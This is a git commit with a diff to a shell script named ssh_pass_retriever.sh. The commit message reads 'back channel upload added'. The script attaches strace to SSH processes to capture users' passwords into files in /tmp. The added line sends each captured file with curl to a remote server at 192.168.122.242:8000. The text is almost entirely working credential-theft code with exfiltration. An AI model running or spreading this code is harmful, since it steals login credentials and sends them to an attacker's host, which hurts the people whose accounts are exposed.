76609fd50bc65c319fd6be1e65b796cc6ae8e7df
1337MD <51073630+1337MD@users.noreply.github.com>
2019-11-09 22:44:48 +0000

    Update ssh_pass_retriever.sh
    back channel upload added

--- ssh_pass_retriever.sh
+++ ssh_pass_retriever.sh
@@ -6,5 +6,6 @@ do
         if [ ! -z "$pid" ]
         then
                 strace -p ${pid} &> /tmp/password_${user}_${pid}
+                curl -F 'data=@path/tmp/password_${user}_${pid}' http://192.168.122.242:8000
         fi
 done
